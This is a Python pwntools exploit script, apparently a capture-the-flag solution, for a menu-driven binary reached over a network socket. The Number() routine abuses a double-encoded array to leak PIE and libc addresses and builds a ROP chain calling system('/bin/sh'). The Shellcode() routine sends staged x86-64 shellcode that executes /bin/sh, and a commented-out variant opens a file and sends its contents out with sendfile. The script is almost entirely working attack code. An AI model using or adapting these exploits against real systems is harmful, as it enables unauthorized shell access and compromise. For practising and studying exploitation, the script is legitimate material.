from pwn import *
import struct
context.log_level ='debug'
context.arch = "amd64"

e = context.binary = ELF('source')
# r= e.process()
r = remote('0',56789)
# lib = e.libc
lib= ELF('libc.so.6')

def send_payload(a):
    double_value = struct.unpack('d', (bytes.fromhex(format(a, '016x')))[::-1])[0]
    print(double_value)
    r.sendlineafter(b"> ",str(double_value))


def register(username, password):
    r.sendline(b"1")
    r.sendlineafter(b"rname: ", username)
    r.sendlineafter(b"sword: ", password)
    r.sendlineafter(b"ption:", password)

def login(username, password):
    r.sendline(b"2")
    r.sendlineafter(b"rname: ", username)
    r.sendlineafter(b"sword: ", password)
    
def Number():
    register(b"a", b"b")
    login(b"a", b"b")
    r.sendline(b"2")
    r.sendline(b"33")

    for i in range(33):
        # time.sleep(0.5)
        send_payload(i)
    
    r.sendline(b"1") #show
    # gdb.attach(r, '''
        # si
    # ''')
    
    pause()
    r.sendline(b"35") # (Shellouble+160)
    r.recvuntil(b'0x0.0')
    Shellouble = int(r.recv(12),16)-160
    log.info("Shellouble: %#x" %Shellouble)
    r.sendline(b"1") #show
    pause()
    r.sendline(b"43") # (__libc_start_call_main+128)
    # r.recvuntil(b"39")
    r.recvuntil(b'> 0x0.')
    pause()
    __libc_start_main = (int(r.recv(12), 16)<<4 ) + 0x7fedfd0ecdc0 -0x7fedfd0ecd90
    
    base_pie = Shellouble - e.sym.Shellouble
    main = base_pie+ e.sym.main
    ret = main+260
    base_libc = __libc_start_main - lib.sym.__libc_start_main
    system_libc = base_libc + lib.sym.system
    binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
    pop_rdi_ret = base_libc+ lib.sym.iconv + 197
    
    log.info("base_pie: %#x" %base_pie)
    log.info("__libc_start_main: %#x" %__libc_start_main)
    log.info("base_libc: %#x" %base_libc)
    log.info("system_libc: %#x" %system_libc)
    log.info("binsh_libc: %#x" %binsh_libc)
    log.info("pop_rdi_ret: %#x" %pop_rdi_ret)
    
    
    r.sendline(b"2") #fix
    r.sendline(b"39")
    for i in range(34):
        r.sendlineafter(b"> ",b"+")
    r.sendlineafter(b"> ",b"+")
    send_payload(ret)
    send_payload(pop_rdi_ret)
    send_payload(binsh_libc)
    send_payload(system_libc)
    
    # gdb.attach(r, '''
        # si
    # ''')
    pause()
    r.sendline(b"0")# exit
   

def Shellcode():
    register(b"a", b"b")
    login(b"a", b"b")
    # r.recv(0x5b)
    r.sendline(b"1")
    
    shellcode1='''
    mov dx, 0x040e
    inc dl
    inc dh
    xchg [rdi], edx
    '''
    shellcode1 += """
    xchg rsi, rdi
    shr edx, 14
    xor edi, edi
    call rsi
    """
    # shellcode1 = """
    # xor eax, eax
    # mov rdx, 0x1122334455667788 
    # xchg rsi, rdi
    # leave
    # ret
    # """

    
    shellcode =asm(shellcode1)
    print(shellcode)
    print("len shellcode: "+str(len(shellcode)))
    print(disasm(shellcode))
    print(hexdump(shellcode))
    # gdb.attach(r, '''
        # b*Shellcode+290
        # c
        
    # ''')
    pause()
    r.recvuntil(b"> Shellcode()\n> ")
    r.sendline(shellcode)
    # resp = r.recv(0x3b)
    # self.c.assert_eq(resp, b"\nChoose one:\n1. Shellcode\n2. Number\n3. Show Info\n0. Exit\n> ", 'Invalid response on Shellcode', status)
    
    # print(b"Recved: "+resp)
    # r.interactive()

    shellcode2 = '''
    nop 
    nop
    mov dx, 0x040e
    inc dl
    inc dh
    xchg [rsi], edx
    mov r10, rsi
    '''
    # shellcode2+='''
    # push 0x1010101 ^ 0x6567
    # xor dword ptr [rsp], 0x1010101
    # mov rax, 0x61726f74732f2e2e
    # push rax
    # /* call open('rsp', 'O_RDONLY', 'rdx') */
    # push SYS_open /* 2 */
    # pop rax
    # mov rdi, rsp
    # xor esi, esi /* O_RDONLY */
    # syscall
    # /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    # mov r10d, 0x7fffffff
    # mov rsi, rax
    # push SYS_sendfile /* 0x28 */
    # pop rax
    # push 1
    # pop rdi
    # cdq /* rdx=0 */
    # call r10
    # '''
    
    shellcode2+= '''
    push   0x68
    movabs rax, 0x732f2f2f6e69622f
    push   rax
    mov    rdi, rsp
    push   0x1016972
    xor    DWORD PTR [rsp], 0x1010101
    xor    esi, esi
    push   rsi
    push   0x8
    pop    rsi
    add    rsi, rsp
    push   rsi
    mov    rsi, rsp
    xor    edx, edx
    push   0x3b
    pop    rax
    call r10
    '''
    
    shellcode= asm(shellcode2)
    print(disasm(shellcode))
    print(hexdump(shellcode))
    pause()
    r.sendline(shellcode)


Number()
# Shellcode()

r.interactive()
